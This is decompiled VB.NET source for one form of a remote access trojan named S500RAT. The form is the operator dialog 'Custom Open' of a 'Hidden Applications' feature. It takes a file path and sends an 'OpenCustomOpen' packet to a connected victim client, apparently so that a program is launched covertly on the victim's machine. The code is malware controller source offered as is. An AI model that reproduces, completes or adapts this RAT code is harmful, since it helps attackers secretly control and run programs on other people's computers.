Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000016 RID: 22
	<DesignerGenerated()>
	Public Partial Class FormCustomOpen
		Inherits Form

		' Token: 0x060001DF RID: 479 RVA: 0x0000EAEF File Offset: 0x0000CCEF
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormCustomOpen_Load
			AddHandler MyBase.Resize, AddressOf Me.FormCustomOpen_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170000D5 RID: 213
		' (get) Token: 0x060001E2 RID: 482 RVA: 0x0000F8CF File Offset: 0x0000DACF
		' (set) Token: 0x060001E3 RID: 483 RVA: 0x0000F8DC File Offset: 0x0000DADC
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000D6 RID: 214
		' (get) Token: 0x060001E4 RID: 484 RVA: 0x0000F91F File Offset: 0x0000DB1F
		' (set) Token: 0x060001E5 RID: 485 RVA: 0x0000F929 File Offset: 0x0000DB29
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170000D7 RID: 215
		' (get) Token: 0x060001E6 RID: 486 RVA: 0x0000F932 File Offset: 0x0000DB32
		' (set) Token: 0x060001E7 RID: 487 RVA: 0x0000F93C File Offset: 0x0000DB3C
		Private Overridable Property ClientInfo As Label

		' Token: 0x170000D8 RID: 216
		' (get) Token: 0x060001E8 RID: 488 RVA: 0x0000F945 File Offset: 0x0000DB45
		' (set) Token: 0x060001E9 RID: 489 RVA: 0x0000F94F File Offset: 0x0000DB4F
		Private Overridable Property Label1 As Label

		' Token: 0x170000D9 RID: 217
		' (get) Token: 0x060001EA RID: 490 RVA: 0x0000F958 File Offset: 0x0000DB58
		' (set) Token: 0x060001EB RID: 491 RVA: 0x0000F964 File Offset: 0x0000DB64
		Friend Overridable Property Open As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Open
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Open_Click
				Dim open As Guna2GradientButton = Me._Open
				If open IsNot Nothing Then
					RemoveHandler open.Click, value2
				End If
				Me._Open = value
				open = Me._Open
				If open IsNot Nothing Then
					AddHandler open.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DA RID: 218
		' (get) Token: 0x060001EC RID: 492 RVA: 0x0000F9A7 File Offset: 0x0000DBA7
		' (set) Token: 0x060001ED RID: 493 RVA: 0x0000F9B1 File Offset: 0x0000DBB1
		Friend Overridable Property Args As Guna2TextBox

		' Token: 0x170000DB RID: 219
		' (get) Token: 0x060001EE RID: 494 RVA: 0x0000F9BA File Offset: 0x0000DBBA
		' (set) Token: 0x060001EF RID: 495 RVA: 0x0000F9C4 File Offset: 0x0000DBC4
		Friend Overridable Property FileName As Guna2TextBox

		' Token: 0x170000DC RID: 220
		' (get) Token: 0x060001F0 RID: 496 RVA: 0x0000F9CD File Offset: 0x0000DBCD
		' (set) Token: 0x060001F1 RID: 497 RVA: 0x0000F9D7 File Offset: 0x0000DBD7
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170000DD RID: 221
		' (get) Token: 0x060001F2 RID: 498 RVA: 0x0000F9E0 File Offset: 0x0000DBE0
		' (set) Token: 0x060001F3 RID: 499 RVA: 0x0000F9EA File Offset: 0x0000DBEA
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170000DE RID: 222
		' (get) Token: 0x060001F4 RID: 500 RVA: 0x0000F9F3 File Offset: 0x0000DBF3
		' (set) Token: 0x060001F5 RID: 501 RVA: 0x0000F9FD File Offset: 0x0000DBFD
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170000DF RID: 223
		' (get) Token: 0x060001F6 RID: 502 RVA: 0x0000FA06 File Offset: 0x0000DC06
		' (set) Token: 0x060001F7 RID: 503 RVA: 0x0000FA10 File Offset: 0x0000DC10
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170000E0 RID: 224
		' (get) Token: 0x060001F8 RID: 504 RVA: 0x0000FA19 File Offset: 0x0000DC19
		' (set) Token: 0x060001F9 RID: 505 RVA: 0x0000FA24 File Offset: 0x0000DC24
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x060001FA RID: 506 RVA: 0x0000FA68 File Offset: 0x0000DC68
		Private Sub FormCustomOpen_Load(sender As Object, e As EventArgs)
			Try
				Me.UiLabel1.Text = Me.FormName
				Me.ClientInfo.Text = Me.Info
				Me.FormSize = True
				Me.MinimumSize = MyBase.Size
				Me.MaximumSize = MyBase.Size
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060001FB RID: 507 RVA: 0x0000FAE4 File Offset: 0x0000DCE4
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060001FC RID: 508 RVA: 0x0000FB3C File Offset: 0x0000DD3C
		Private Sub FormCustomOpen_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060001FD RID: 509 RVA: 0x0000FBD0 File Offset: 0x0000DDD0
		Private Sub Open_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.FileName.Text, Nothing, False) = 0
			If flag Then
				MessageBox.Show("Please enter the file path", "Hidden Applcations | Custom Open!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			Else
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "OpenCustomOpen"
					msgPack.ForcePathObject("Filename").AsString = Me.FileName.Text
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					MyBase.Close()
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x060001FE RID: 510 RVA: 0x0000FC8C File Offset: 0x0000DE8C
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x040000E9 RID: 233
		Public Client As Clients

		' Token: 0x040000EA RID: 234
		Public Info As String

		' Token: 0x040000EB RID: 235
		Public FormName As String

		' Token: 0x040000EC RID: 236
		Private FormSize As Boolean
	End Class
End Namespace
